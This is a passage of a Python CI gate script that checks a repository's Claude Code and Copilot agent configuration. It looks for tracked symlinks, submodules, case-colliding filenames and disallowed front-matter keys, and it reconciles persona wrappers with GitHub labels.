                f"initialized — the index in {top_real!r} records a gitlink above it and "
                f"says nothing about the files on disk, which came from somewhere else: "
                f"unverified rather than clean"
            )
            continue
        if above:
            continue
        # An entry UNDER it counts too — but when the queried path is a `.claude` ROOT, one
        # entry anywhere beneath it is NOT the question: each POLICED CHILD that holds files
        # on disk has to be covered in its own right. `tracked-startup-config` queries the
        # root directly, so an enclosing checkout tracking one innocuous
        # `export/.claude/keep` used to CLEAR an export whose `.claude/skills` it knows
        # nothing about, while the roster and command/skill checks (which query
        # `.claude/agents`, `.claude/skills`) correctly reported the same tree unverified:
        # one report, two verdicts about one foreign tree (PR-901 SRE addendum, and PR-901
        # second round RT-4 for the rule itself). An unpoliced sibling — a tracked
        # `.claude/hooks` link, with no policed child on disk at all — still counts as
        # covered, because the index plainly does answer about that tree.
        covered = any(_folds_under(parts, prefix) for _mode, _name, parts in listed)
        matched_root = _policed_root_parts(prefix)
        if covered and matched_root is not None and matched_root[0] == prefix:
            covered = all(
                any(
                    _folds_under(parts, prefix + (child,))
                    for _mode, _name, parts in listed
                )
                for child in matched_root[1]
                if _has_disk_entries(os.path.join(on_disk[spec], child))
            )
        if covered:
            continue
        if _root_owned_by_index(prefix, listed):
            # Untracked work in the checkout the operator is standing in: a note, and the
            # walk polices the files (PR-901 SRE L-1).
            notes.append(
                f"{spec}: "
                f"{_count_uncovered_disk_files(on_disk[spec], prefix, listed)} file(s) on "
                f"disk are not in the index of {top_real!r} and were walked, not cleared by "
                f"git — `git add` them (or remove them) if they are meant to ship, because a "
                f"file the index does not hold cannot be cleared by it"
            )
            continue
        unverified.append(
            f"{spec!r} holds files on disk that the work tree git answered from "
            f"({top_real!r}) does not track — its index says nothing about them, and nothing "
            f"under a policed `.claude` child is tracked there either, so this is a tree that "
            f"checkout does not own: unverified rather than clean"
        )
    findings: "list[tuple[str, str, str]]" = []
    for mode, name, parts in listed:
        matched = next((prefix for prefix in prefixes if _prefix_matches(parts, prefix)), None)
        if matched is None and not any(_folds_under(parts, spec) for spec in scope):
            continue
        if mode == _SPARSE_DIR_MODE or name.endswith("/"):
            return None, (
                f"the index in {top_real!r} is SPARSE and collapses {name!r} into a single "
                f"directory entry, so the files under it are not listed — unverified rather "
                f"than clean; re-run with `git sparse-checkout disable`"
            ), notes
        if _is_undecodable(name):
            # Fail CLOSED before any name comparison: a path this gate cannot decode is a
            # path it cannot compare (PR-901 addendum 2).
            findings.append(("encoding", "", name))
            continue
        expected = None
        if matched is not None and any(
            part != want for part, want in zip(parts[: len(matched)], matched)
        ):
            expected = "/".join(matched)
        elif (
            matched is not None
            and _is_skill_manifest_name(parts[-1])
            and parts[-1] != SKILL_MANIFEST_NAME
            and _fold(matched[-1]) == _fold(SKILLS_CHILD_NAME)
        ):
            # The LEAF the CLI resolves by name. `ſkill.md`, `skill.md` and `Skill.MD` are one
            # file to the checkout and to Claude Code, so the index may hold only the
            # canonical spelling — otherwise the reviewer reading `SKILL.md` in the tree and
            # git recording something else are looking at different things (PR-901 F-1).
            expected = "/".join(parts[:-1] + (SKILL_MANIFEST_NAME,))
        elif (
            matched is not None
            and _is_copilot_agent_name(parts[-1])
            and parts[-1] != _canonical_copilot_agent_name(parts[-1])
            and _fold(matched[-1]) == _fold("agents")
        ):
            # Same rule as the manifest leaf, for the wrapper SUFFIX. `x.AGENT.MD` is the file
            # Copilot loads on a case-insensitive checkout, so the index may hold only the
            # canonical `.agent.md` spelling — two of them cannot coexist there, and a
            # reviewer reading `x.agent.md` in the tree must be reading what git recorded.
            expected = "/".join(parts[:-1] + (_canonical_copilot_agent_name(parts[-1]),))
        if expected is not None:
            findings.append(("case", expected, name))
        elif mode in TRACKED_LINK_MODES:
            findings.append(("link", mode, name))
    # Findings AND the coverage reason, never one instead of the other. A `.claude` whose
    # policed children are untracked on disk but whose ONE tracked entry is a `hooks` symlink
    # used to return `(None, reason)` — three SKIPs, exit 0, and the link git had already
    # named discarded on the way out (PR-901 last round, F-1). The callers report a FAIL
    # carrying the reason as an "ALSO UNVERIFIED" note (:func:`_fail_notes`).
    return (
        sorted(set(findings), key=lambda item: (item[2], item[0], item[1])),
        "; ".join(unverified),
        notes,
    )


def _folded_index_tracked(path: str) -> "bool | None":
    """Does SOME index entry fold onto `path`? ``True``/``False``, or ``None`` if unanswerable.

    The companion :func:`_git_tracked` needs (PR-901 second round, H-1). That function asks git
    about one byte-exact spelling, which is precisely the question a case- or
    normalization-variant defeats: on a macOS clone of a repo that tracks
    `.claude/Settings.local.json`, the file the CLI reads sits at
    `.claude/settings.local.json` and `git ls-files --error-unmatch` calls it UNTRACKED — so
    the gate reported it as harmless per-machine state while it shipped to every checkout.
    """
    if shutil.which("git") is None:
        return None
    absolute = os.path.abspath(path)
    parent = os.path.dirname(absolute) or os.curdir
    if not os.path.isdir(parent):  # pragma: no cover - defensive
        return None
    # The PARENT is resolved, the leaf never is: resolving the leaf would follow the very link
    # the caller may be asking about.
    parent_real = os.path.realpath(parent)
    candidate = os.path.join(parent_real, os.path.basename(absolute))
    top = _git_toplevel(parent_real)
    if top is None:
        return None
    top_real = os.path.realpath(top)
    if not _is_within(candidate, top_real):
        return None
    entries = _ls_files(top_real)
    if entries is None:
        return None
    wanted = _fold_parts(os.path.relpath(candidate, top_real))
    return any(_fold_parts(name) == wanted for _mode, name in entries)


def _tracked_by_git(path: str) -> "bool | None":
    """Is `path` tracked, by its own spelling OR by one that folds onto it in the work tree?

    ``None`` when either question could not be answered and the other said "no": an
    unanswerable question must reach the operator as unverified, never as "untracked, fine".
    """
    exact = _git_tracked(path)
    if exact:
        return True
    folded = _folded_index_tracked(path)
    if folded:
        return True
    if exact is None or folded is None:
        return None
    return False


def _tracked_links(paths: "list[str]") -> "list[tuple[str, str]] | None":
    """`(mode, path)` for every entry git records as a LINK under `paths`, or ``None``.

    The link half of :func:`_index_findings`, kept as its own name because "is this a tracked
    symlink or submodule" is the question the fixtures and the fail-closed contract are
    written against. ``None`` still means "git could not answer", never "no links".
    """
    findings, reason, _notes = _index_findings(paths)
    if findings is None:
        return None
    links = [(detail, path) for kind, detail, path in findings if kind == "link"]
    if reason and not links:
        # Part of the surface was not covered and nothing was found in the rest: "could not
        # answer", never "no links". A link that WAS found is returned — it is a fact about
        # the tree regardless of what else went unexamined (PR-901 last round, F-1).
        return None
    return links


def config_root_pathspec(path: str) -> "str | None":
    """The config-root directory a policed path lives in — the root path every check adds.

    The `pathspec` in this function's name is HISTORICAL: the index is listed once with no
    pathspec at all (see :func:`_index_findings`) and the value returned here is the scoping
    PREFIX the findings are selected by. The name is kept because the fixtures and the
    assertions are written against it.

    Every local check used to ask git only about its OWN subtree (`.claude/agents`,
    `.claude/commands`, `.claude/skills`) plus three files, while the prose promised "any
    tracked symlink under `.claude/`". The gap was real: a tracked link at `.claude/hooks`,
    `.claude/output-styles/x.md` — or at `.claude` ITSELF — is configuration Claude Code
    reads and no check named it (LAST-CERT F2). The parent directory prefix subsumes every
    subtree AND the root entry, so each check asks about it alongside its own paths; the
    per-check queries stay, because a check must still name a link in the tree it owns even
    when it is pointed somewhere else entirely (a fixture, a `--agents-dir` override).

    Duplicate findings across checks are harmless: :func:`_dedupe_link_problems` collapses
    them to one line per link WITHIN each check's report.

    With a SECOND root in play the no-match branch became load-bearing. It used to synthesize
    `dirname(path)/.claude` for ANY path with no `.claude` ancestor, which is right for the
    `.mcp.json` sibling it was written for and catastrophically wrong for `.github/agents`:
    that would have been scoped to `.github/.claude`, a directory that does not exist, so
    every finding in the Copilot tree would have been selected away and the check would have
    reported a clean tree it never looked at. So the synthesis is now narrowed to the known
    `.claude`-sibling leaves, and anything else returns ``None`` — :func:`link_query_paths`
    skips falsy candidates, leaving such a path queried under its OWN spelling and nothing
    else. A wrong root is a false green; no root is merely a narrower true answer.
    """
    if not path:
        return None
    normalized = os.path.normpath(path)
    if os.altsep:  # pragma: no cover - Windows
        normalized = normalized.replace(os.altsep, os.sep)
    parts = normalized.split(os.sep)
    for index in range(len(parts) - 1, -1, -1):
        if _fold(parts[index]) in POLICED_CHILDREN_BY_ROOT:
            # The caller's own spelling up to the root, so the SKIP reason a responder reads
            # names `.claude`/`.github` rather than an absolute path they did not type.
            return os.sep.join(parts[: index + 1]) or os.sep
    if _fold(os.path.basename(normalized)) != _fold(DEFAULT_MCP_CONFIG):
        # Not a root, and not a known root SIBLING either. Answering the path's PARENT here
        # scoped the query to whatever directory that happened to be — `os.curdir`, i.e. the
        # WHOLE REPOSITORY, for the root-relative `.mcp.json` this gate actually runs on,
        # which is how a submodule at `vendor/lib` or a symlink at `docs/x/alias.md` came to
        # fail `tracked-startup-config` with a `.claude` remedy (PR-901 F-B). Answering a
        # SYNTHESIZED root is worse still — see the false-green note above.
        return None
    # `.mcp.json` is a startup surface that sits BESIDE the root rather than under it, so the
    # root it belongs to is the `.claude` next to it (PR-901 F-B).
    return os.path.normpath(os.path.join(os.path.dirname(normalized) or os.curdir, CLAUDE_DIR_NAME))


def claude_root_pathspec(path: str) -> "str | None":
    """Back-compatible name for :func:`config_root_pathspec` (fixtures reference it)."""
    return config_root_pathspec(path)


def link_query_paths(*paths: str) -> "list[str]":
    """The paths a check asks about: each policed path AND its `.claude` root, deduped.

    Despite the historical `pathspec` in :func:`claude_root_pathspec`, none of these reach
    git as a pathspec — they are the scoping prefixes the once-listed index is filtered by.
    Order matters only for which directory :func:`_tracked_links` runs git from, and the
    policed path comes first so a check pointed at a fixture tree asks from there.
    """
    ordered: "list[str]" = []
    for path in paths:
        for candidate in (path, claude_root_pathspec(path)):
            if candidate and candidate not in ordered:
                ordered.append(candidate)
    return ordered


# Cache of `git rev-parse --show-toplevel` answers, keyed by the directory asked from, so the
# de-duplication below spends at most one subprocess per directory per run.
_TOPLEVEL_CACHE: "dict[str, str | None]" = {}


def _git_toplevel(directory: str) -> "str | None":
    """The work-tree root containing `directory`, or ``None`` (cached; never raises)."""
    probe = directory
    while probe and not os.path.isdir(probe):
        parent = os.path.dirname(probe)
        if parent == probe:
            return None
        probe = parent
    if not probe:
        return None
    if probe in _TOPLEVEL_CACHE:
        return _TOPLEVEL_CACHE[probe]
    top: "str | None" = None
    if shutil.which("git") is not None:
        try:
            proc = subprocess.run(
                ["git", "rev-parse", "--show-toplevel"],
                cwd=probe,
                capture_output=True,
                text=True,
                timeout=30,
                env=_git_env(),
            )
        except (OSError, subprocess.TimeoutExpired):  # pragma: no cover - environment dependent
            proc = None
        if proc is not None and proc.returncode == 0 and proc.stdout.strip():
            top = proc.stdout.strip()
    _TOPLEVEL_CACHE[probe] = top
    return top


# Nothing in this file recovers a path from a rendered MESSAGE any more. Every producer of a
# link or case-collision line returns a :class:`_LinkMessage` carrying the path and the kind
# structurally, because the pattern that used to do it printed one link as two annotations
# whenever the path held a quote character (`.claude/skills/a\'b"c`: `repr` escapes rather
# than switches quote style) — PR-901 F-D and, at the second round, L-1.


def _normalize_link_path(path: str) -> str:
    """One spelling for one link: the path relative to the git work-tree root when knowable.

    The walk-based checks report the path the CALLER passed (often absolute, e.g. a
    `--mcp-config /abs/.mcp.json`), while git reports it repo-root-relative (`.mcp.json`).
    Two spellings of one path therefore produced two `::error::` annotations, which reads as
    two defects to fix (LAST-CERT F4). Normalizing both to the top-level-relative form makes
    them comparable. A relative path that does not exist under
    the current directory is assumed to be already repo-root-relative (that is exactly what
    `git ls-files --full-name` returns from a fixture repo elsewhere) and is left alone.
    """
    if not path:
        return path
    absolute = os.path.abspath(path)
    if not os.path.isabs(path) and not os.path.lexists(absolute):
        return os.path.normpath(path)
    # The PARENT is resolved (`/var/folders/...` is a symlink to `/private/var/folders/...`
    # on macOS, and `git rev-parse` answers with the resolved spelling), the leaf never is:
    # resolving the leaf would follow the very link under investigation.
    parent = os.path.realpath(os.path.dirname(absolute))
    absolute = os.path.join(parent, os.path.basename(absolute))
    top = _git_toplevel(parent)
    if top:
        try:
            return os.path.normpath(os.path.relpath(absolute, top))
        except ValueError:  # pragma: no cover - different drives on Windows
            pass
    return os.path.normpath(absolute)


def _dedupe_link_problems(*groups: "list[str] | list[tuple[str, str]]") -> "list[str]":
    """Concatenate problem groups, keeping ONE line per (kind, link path) (LAST-CERT F4).

    Groups are kept in the order given, so a caller puts the message it prefers first — the
    git-mode one, which names the index mode and is decisive, ahead of the walk's "is a
    symlink".

    The key is STRUCTURAL and it is the only key: a :class:`_LinkMessage` carries the path and
    the kind it was built with, and a ``(path, message)`` pair (what the index query returns)
    carries the path beside it. Nothing is parsed out of the rendered text, so a path holding
    an apostrophe AND a double quote still collapses to one line (PR-901 F-D / L-1), and the
    KIND is part of the key so a link and a collision at one path stay distinguishable.

    Anything else — an integrity sentence that happens to QUOTE a link clause, such as the
    roster's "no persona wrappers found … because `.claude` is a tracked gitlink" — is a
    different finding and passes through untouched (deduplicated only against an identical
    string). Dropping it as "the same link" is how an operator lost the one line that
    explained an empty roster (PR-901 second round, RT-5).

    One extra collapse, and only one: a CASE finding supersedes a WALK finding at a DIFFERENT
    spelling that FOLDS onto it. On a case-insensitive checkout a link committed as
    `.claude/Skills/evil-link` is reported twice — by the index as a collision at
    `.claude/Skills/…` and by the walk, which reads it through the merged directory, as a link
    at `.claude/skills/…`. One file, one remedy (rename it), and the collision line is the one
    that explains why the two spellings are the same file, so it wins (PR-901 F-2). The two
    findings at the SAME byte-exact path stay separate: a path that is both a collision and a
    tracked link needs both remedies (rename it, and replace it with real files).

    Only a WALK finding may be superseded that way, and that is the whole of the rule
    (PR-901 RT-1). An INDEX finding is git's answer about a DISTINCT index entry at its own
    byte-exact spelling: `.claude/Skills/x` (a plain file, a collision) and `.claude/skills/x`
    (mode 120000, a tracked symlink) are TWO entries that need TWO remedies, and suppressing
    the second because its path folds onto the first printed the collision alone — the
    operator learned about the link only after renaming, a second round for one review. The
    fold collapse is also ORDER-INDEPENDENT: the collisions are collected from every group
    before anything is filtered, so a caller that lists the walk first still gets one line
    (only the ORDER of the surviving lines follows the group order).
    """
    seen: "set[tuple[str, str]]" = set()
    flat = [
        problem if isinstance(problem, tuple) else (getattr(problem, "path", None), problem)
        for group in groups
        for problem in group
    ]
    # folded path -> the byte-exact spellings reported as a `case` collision ANYWHERE.
    case_folds: "dict[str, set[str]]" = {}
    for path, message in flat:
        if path is not None and getattr(message, "kind", "link") == "case":
            case_folds.setdefault(_fold(_normalize_link_path(path)), set()).add(
                _normalize_link_path(path)
            )
    kept: "list[str]" = []
    for path, message in flat:
        if path is None:
            if message not in kept:
                kept.append(message)
            continue
        kind = getattr(message, "kind", "link")
        normalized = _normalize_link_path(path)
        key = (kind, normalized)
        if key in seen:
            continue
        if kind != "case" and getattr(message, "source", "walk") != "index":
            spellings = case_folds.get(_fold(normalized))
            if spellings and normalized not in spellings:
                continue
        seen.add(key)
        kept.append(message)
    return kept


def tracked_symlink_problems(
    paths: "list[str]",
) -> "tuple[list[tuple[str, str]], list[str], list[str]]":
    """Return (problems, unverified, notes) for git's index answer about `paths` (LAST-CERT F1).

    Each problem is a ``(path, message)`` pair so the caller can de-duplicate it against a
    walk's message without parsing text (:func:`_dedupe_link_problems`). Two shapes are
    reported: a tracked LINK — a SYMLINK (mode 120000) or a GITLINK/submodule (mode 160000),
    neither of which the working tree need show — and a CASE COLLISION, an index entry that
    merges into a policed path on a case-insensitive checkout (:func:`_case_collision_problem`).

    ``notes`` is context that is neither: an untracked-only subtree inside a `.claude` the
    index DOES own is walked and policed normally, and saying so beats both a silent pass and
    a SKIP telling the operator to go and stand where they already are (PR-901 SRE L-1).

    ``unverified`` is non-empty when git could not answer, or answered about only part of the
    queried surface — it can therefore accompany real ``problems`` rather than replace them
    (PR-901 last round, F-1) — and it carries WHY: "'…' is not inside a git checkout" and
    "path '…' lies outside the work tree git answered from (…)" send a responder to
    different fixes, and reporting the second as the first is how a symlinked `.claude`
    used to excuse itself from the query (PR-901 F-A). The caller reports SKIP with
    that reason rather than passing, because "no link found" and "could not look" are
    different claims and only one of them is safe to go green on.
    """
    findings, reason, notes = _index_findings(paths)
    unverified = (
        [
            "git could not say whether "
            + ", ".join(sorted(paths))
            + f" hold tracked symlinks, submodules or fold-variants ({reason}) — a "
            "link whose target is absent here, a submodule CI checks out empty, and a "
            "spelling that folds onto a policed path on this checkout are all INVISIBLE to "
            "the path checks, so this is unverified, not clean; "
            + (
                "install git and rerun"
                if "git is not on PATH" in reason
                else "run the gate inside the git checkout that tracks these files"
            )
        ]
        if reason
        else []
    )
    if findings is None:
        return [], unverified, notes
    # Both, when git covered part of the surface and named something in it: the caller fails
    # on the problems and carries the reason as an "ALSO UNVERIFIED" note, so a tracked
    # `.claude/hooks` link is reported even though the policed children beside it were
    # untracked (PR-901 last round, F-1).
    return [
        (path, _index_finding_problem(kind, detail, path))
        for kind, detail, path in findings
    ], unverified, notes


def linked_agents_root_problems(agents_dir: str) -> "list[tuple[str, str]]":
    """`(path, message)` for a tracked link AT `agents_dir` or at its parent, else `[]`.

    The narrow question `read_roster` needs when its scan comes up empty: is the roster
    missing because the directory is empty, or because `.claude`/`.claude/agents` is a
    tracked SYMLINK or SUBMODULE? A non-recursive clone (what CI's `actions/checkout` makes)
    leaves a submodule directory EMPTY, so the walk finds nothing and the operator was told
    "no persona wrappers found" with the gitlink never named — an exit-2 "the gate could not
    run" for what is in fact drift a contributor can fix (PR-901 F-A).

    Only the two roots count: a link DEEPER in the tree does not explain an empty roster and
    is reported by the roster check's own query. ``[]`` when git cannot answer — the caller
    keeps its existing behavior then.
    """
    links = _tracked_links(link_query_paths(agents_dir))
    if not links:
        return []
    absolute = os.path.abspath(agents_dir)
    parent = os.path.dirname(absolute)

    def _is_root(reported: str) -> bool:
        # `reported` is repo-root-relative (`--full-name`), so the absolute spelling of the
        # same path ENDS with it. Compared this way rather than through
        # :func:`_normalize_link_path`, which resolves against the process's current
        # directory and would therefore answer differently depending on where the gate was
        # started from — the fixture repo is never the cwd.
        suffix = os.sep + reported.replace("/", os.sep)
        return absolute.endswith(suffix) or parent.endswith(suffix)

    return [
        (path, _tracked_link_problem(mode, path)) for mode, path in links if _is_root(path)
    ]


def read_roster(agents_dir: str) -> "tuple[set[str], list[str], int]":
    """Return (persona slugs, integrity problems, wrappers policed) from `.claude/agents/*.md`.

    "Is a persona wrapper" is a property of the FILE, not of its name: only a
    `.claude/agents/*.md` file whose front matter carries a `name:` is a roster entry. Plain
    markdown that lives alongside the wrappers (a README, a template) is ignored rather than
    being mistaken for a persona slug — there is no fall-back to the filename stem, so a
    stray README.md cannot red the gate. "Plain markdown" means NO `---` front-matter fence
    at all: a file that OPENS a fence is a persona candidate, so a fence with no `name:` is
    an integrity problem rather than a silent skip. That is the fail-closed half of the
    strict reader — every spelling the reader cannot interpret used to land in the "ignored,
    not a persona" bucket, which is exactly how a `permissionMode: bypassPermissions` written
    as `"permissionMode":` slipped past the policy (VERIFY-F1).

    The third return value is how many TOP-LEVEL wrappers had the front-matter policy in
    :func:`validate_agent_frontmatter` applied to them, so the passing report can attest that
    the policy actually ran over the roster instead of silently covering zero files.

    The slug is the front-matter `name:` (canonical); the filename stem must match it, and a
    mismatch is reported as an integrity problem so a mislabeled wrapper cannot hide.

    Each top-level wrapper's front matter is additionally held to the policy in
    :func:`validate_agent_frontmatter` (no prompt-skipping `permissionMode`, no
    `hooks`/`mcpServers`/`env`, no unknown keys); violations are returned as integrity
    problems alongside the naming ones. A NESTED wrapper is policed too — both classes of
    problem report on the same run, so fixing the nesting does not reveal a second failure.

    The roster itself is NON-RECURSIVE — only files sitting directly in ``agents_dir`` count.
    The scan, however, IS recursive, because the workflow path filter (`.claude/agents/**`)
    is: a `name:`-bearing wrapper hidden in a subdirectory would otherwise be silently
    ignored by this gate while still shipping as an agent. Such a NESTED WRAPPER IS AN
    INTEGRITY ERROR, reported here rather than passed over.

    The walk uses :func:`os.walk` rather than a recursive ``glob``: ``glob`` skips
    DOT-PREFIXED directories, so a wrapper parked in `.claude/agents/.hidden/` would be
    invisible to this gate while `.claude/agents/**` still shipped it. Symlinked directories
    are not followed (``followlinks=False``) so a link loop cannot hang the gate — but a
    tracked SYMLINK (a directory, or a wrapper file) is reported as an integrity problem
    rather than passed over in silence, because Claude Code follows it and would load
    configuration this walk never opened (CERT-F1, :func:`_symlink_problem`).

    When the scan finds NO top-level wrapper, the raised ``FileNotFoundError`` carries any
    integrity problems collected on the way (e.g. "1 nested wrapper was found and ignored:
    <path>"), so an agents directory whose wrappers all sit one level down is diagnosed
    precisely instead of reading as an empty directory.
    """
    all_paths: "list[str]" = []
    link_problems: "list[str]" = []
    # The agents directory ITSELF may be the link. `os.walk` on a dangling one yields
    # nothing at all, so without this the roster would read as "empty" (or, once the target
    # exists on a developer's machine, as a clean pass over files CI never saw).
    if os.path.islink(agents_dir):
        link_problems.append(_symlink_problem("agent", agents_dir))
    for dirpath, dirnames, filenames in os.walk(agents_dir, followlinks=False):
        dirnames.sort()  # deterministic traversal order
        # A symlinked SUBDIRECTORY is listed but not descended into (followlinks=False),
        # while Claude Code reads straight through it — report the link (CERT-F1).
        link_problems.extend(_walk_symlink_problems("agent", dirpath, dirnames))
        for filename in filenames:
            path = os.path.join(dirpath, filename)
            # EVERY entry is link-checked, not only the `.md` ones: `os.walk` lists a
            # DANGLING link (of any name) among `filenames` whatever it points at, and a
            # link named `README` today can be repointed at a wrapper tomorrow. Deciding by
            # the name would let the link's own spelling choose whether it is inspected.
            if os.path.islink(path):
                # A symlinked WRAPPER is still read and policed below when it resolves (the
                # read fails closed if it dangles); the link itself is reported because what
                # CI reviews is the link, not the target.
                link_problems.append(_symlink_problem("agent wrapper", path))
            # FOLDED, not lowered: Claude Code loads `Foo.MD` too, and the same folded key
            # decides the name match here, in the command/skill walk and in the index query,
            # so no question can see a spelling another cannot (PR-901 F-1).
            if _is_markdown_name(filename):
                all_paths.append(path)
    all_paths.sort()
    slugs: "set[str]" = set()
    problems: "list[str]" = sorted(link_problems)
    nested: "list[str]" = []
    policed = 0
    first_seen: "dict[str, str]" = {}
    for path in all_paths:
        try:
            frontmatter, duplicate_keys = _read_frontmatter(path)
        except FrontmatterError as exc:
            # Fail CLOSED: a front-matter block this gate cannot read strictly is reported,
            # never skipped. A real YAML parser (Claude Code) may well read a dangerous key
            # out of it, so "unparseable" must cost the same as "policy violation".
            problems.append(f"agent wrapper {path!r} {exc}")
            continue
        if frontmatter is None:
            continue  # plain markdown, no front-matter fence — not a persona wrapper
        for key in duplicate_keys:
            problems.append(
                f"agent wrapper {path!r} declares duplicate front-matter key {key!r}; YAML "
                f"keeps the LAST value while this gate reads the first, so the policy would "
                f"validate a value the CLI never uses — keep exactly one {key!r} line"
            )
        relative = os.path.relpath(path, agents_dir)
        if os.sep in relative or (os.altsep and os.altsep in relative):
            # A wrapper below the top level is NOT a roster entry (the roster is flat) but
            # must not vanish silently — the workflow's path filter would still ship it.
            # The policy still runs on it (both classes of problem report at once) while the
            # nesting problem is tracked separately, because only NESTING explains an
            # otherwise-empty agents directory in the FileNotFoundError below.
            if frontmatter.get("name"):
                nested.append(
                    f"persona wrapper {path!r} is nested; wrappers must sit directly in "
                    f"{agents_dir}"
                )
                problems.append(nested[-1])
            problems.extend(validate_agent_frontmatter(path, frontmatter))
            continue
        policed += 1
        problems.extend(validate_agent_frontmatter(path, frontmatter))
        name = frontmatter.get("name") or None
        if not name:
            # A fenced file IS a persona candidate; without a `name:` it can neither be
            # reconciled against a label nor be dismissed as plain markdown. Any forbidden
            # key it carries has already been named by the policy call above.
            problems.append(
                f"agent wrapper {path!r} opens a `---` front-matter fence but declares no "
                f"`name:` — a fenced file in {agents_dir} is a persona wrapper candidate and "
                f"cannot be reconciled against a persona label; add the `name:` (matching the "
                f"filename stem) or remove the front-matter fence"
            )
            continue
        stem = os.path.basename(path)[: -len(".md")]
        if name != stem:
            problems.append(
                f"agent wrapper {path!r} front-matter name {name!r} does not match its "
                f"filename stem {stem!r} — rename one so the persona slug is unambiguous"
            )
        if name in slugs:
            problems.append(
                f"duplicate persona slug {name!r} — declared by both "
                f"{first_seen[name]!r} and {path!r}"
            )
        else:
            first_seen[name] = path
        slugs.add(name)
    if not slugs:
        message = (
            f"no persona wrappers found directly under {agents_dir!r} "
            f"(expected {agents_dir!r}/*.md with a front-matter `name:`)"
        )
        # A link one level UP is the quietest way for this raise to be misleading: the
        # directory itself looks ordinary, `os.walk` yields nothing (a dangling parent has no
        # children), and the operator is told the roster is empty with no hint that what they
        # are looking at is a link resolving somewhere else — or nowhere at all in a
        # checkout-only CI job (LAST-CERT F6). Named here because the git-mode query that
        # would otherwise name it lives in a check this raise pre-empts.
        parent = os.path.dirname(os.path.abspath(agents_dir))
        if parent and os.path.islink(parent):
            message += (
                f"; its parent {parent!r} is a SYMLINK, so the roster this gate could reach "
                f"depends on where that link resolves on this machine — replace the link "
                f"with real directories"
            )
        else:
            # `os.path.islink` above answers only about THIS working tree. A tracked
            # SUBMODULE at `.claude` is a directory here (populated) or an empty one in CI,
            # never a link — so the index is the only place it is visible, and without this
            # clause the operator reads "your roster is empty" about a gitlink that ships
            # configuration the moment it is initialized (PR-901 F-A).
            for _path, clause in linked_agents_root_problems(agents_dir):
                message += "; " + clause
        if nested:
            # Only NESTING explains "the directory looks empty" — naming those wrappers turns
            # it into "your wrappers are one level too deep", which is the actual fix. Other
            # problems (unparseable/policy) are not nesting and must not be described as such.
            was = "wrapper was" if len(nested) == 1 else "wrappers were"
            message += (
                f"; {len(nested)} nested {was} found and ignored: "
                + "; ".join(nested)
            )
        other = [problem for problem in problems if problem not in nested]
        if other:
            # Unparseable/policy problems are not nesting, so they get their own clause
            # rather than being mislabeled — but they must still be REPORTED here, or a
            # directory holding only an unreadable wrapper would raise a bare "empty".
            message += (
                f"; {len(other)} other integrity problem(s): " + "; ".join(other)
            )
        raise FileNotFoundError(message)
    return slugs, problems, policed


# --- Truncation logic --------------------------------------------------------------------

def derive_truncated_label(slug: str) -> "str | None":
    """The documented truncation for an over-long persona label drops trailing `-engineer`.

    Returns ``None`` when the slug doesn't carry the redundant suffix, OR when even the
    truncated label would still exceed GitHub's 50-character cap — a future, longer slug
    could be "documented" yet remain unstorable as a label, so we refuse to derive a
    truncation that itself doesn't fit rather than pretend it does.
    """
    if not slug.endswith(TRUNCATION_SUFFIX):
        return None
    truncated = slug[: -len(TRUNCATION_SUFFIX)]
    if len(PERSONA_PREFIX + truncated) > GITHUB_LABEL_MAX:
        return None
    return truncated


def truncation_documented(taxonomy_text: str, slug: str, trunc: str) -> bool:
    """True only when label-taxonomy.md records BOTH the full slug and the standalone label.

    The truncated label must appear as its own token — not merely as the prefix of the full
    slug — so a stray substring can't be mistaken for documentation.
    """
    if not taxonomy_text:
        return False
    full_label = PERSONA_PREFIX + slug
    if full_label not in taxonomy_text:
        return False
    standalone = re.escape(PERSONA_PREFIX + trunc) + r"(?![\w-])"
    return re.search(standalone, taxonomy_text) is not None


# --- Check 1: roster <-> persona labels --------------------------------------------------

def reconcile_roster_labels(
    roster: "set[str]", labels: "set[str]", taxonomy_text: str
) -> "tuple[list[str], list[tuple[str, str]]]":
    """Return (problems, allowed_truncations). Empty problems ⇒ reconciled."""
    roster_only = set(roster) - set(labels)
    label_only = set(labels) - set(roster)
    allowed: "list[tuple[str, str]]" = []

    for slug in sorted(roster_only):
        if len(PERSONA_PREFIX + slug) <= GITHUB_LABEL_MAX:
            continue  # would fit un-truncated; a truncation here is not justified
        trunc = derive_truncated_label(slug)
        if trunc and trunc in label_only and truncation_documented(taxonomy_text, slug, trunc):
            allowed.append((slug, trunc))

    for slug, trunc in allowed:
        roster_only.discard(slug)
        label_only.discard(trunc)

    problems: "list[str]" = []
    # Truncated labels already accounted for by an "undocumented truncation" problem below;
    # they must NOT ALSO be reported as stale `label_only` labels (that double-counts one
    # issue as two — finding 7b).
    covered_truncations: "set[str]" = set()
    for slug in sorted(roster_only):
        full_label = PERSONA_PREFIX + slug
        if len(full_label) > GITHUB_LABEL_MAX:
            trunc = derive_truncated_label(slug)
            if trunc and not truncation_documented(taxonomy_text, slug, trunc):
                problems.append(
                    f"roster persona {slug!r} needs a truncated label "
                    f"'{PERSONA_PREFIX}{trunc}' (full '{full_label}' is {len(full_label)} > "
                    f"{GITHUB_LABEL_MAX} chars) but that truncation is not recorded in "
                    f"label-taxonomy.md — document it or reconcile the label"
                )
                if trunc in label_only:
                    # The truncated label exists; the problem above already covers this
                    # pair, so suppress the redundant stale-label message for it.
                    covered_truncations.add(trunc)
                continue
        problems.append(
            f"roster persona {slug!r} has no matching '{PERSONA_PREFIX}{slug}' GitHub label "
            f"— create the label, or remove/rename the .claude/agents/*.md wrapper whose "
            f"front-matter name is {slug!r}"
        )
    for label in sorted(label_only - covered_truncations):
        problems.append(
            f"GitHub label '{PERSONA_PREFIX}{label}' has no matching "
            f".claude/agents/{label}.md wrapper (front-matter name: {label}) — add the "
            f"wrapper, or delete the stale label"
        )
    return problems, allowed


def parse_documented_persona_labels(taxonomy_text: str) -> "set[str]":
    """Return the committed persona-label slug set documented in label-taxonomy.md.

    Reads the block delimited by the ``BEGIN/END persona-labels`` markers and returns the
    slug of every ``persona:<slug>`` label listed there (prefix stripped, matching what
    :func:`fetch_persona_labels` returns for the live set). This is the OFFLINE source of
    truth for the roster↔label check — it lets the gate catch a removed/added persona
    without the live GitHub label set. Labels are listed exactly as stored on GitHub, i.e.
    with the one documented 50-char truncation applied.

    Raises ``ValueError`` when the block is missing or empty so a mis-edit can't silently
    disable offline drift detection (a data error, surfaced as exit 2 by ``main``).
    """
    lines = taxonomy_text.splitlines()
    start = end = None
    for index, line in enumerate(lines):
        if PERSONA_LABELS_BEGIN in line:
            start = index
        elif PERSONA_LABELS_END in line:
            end = index
            break
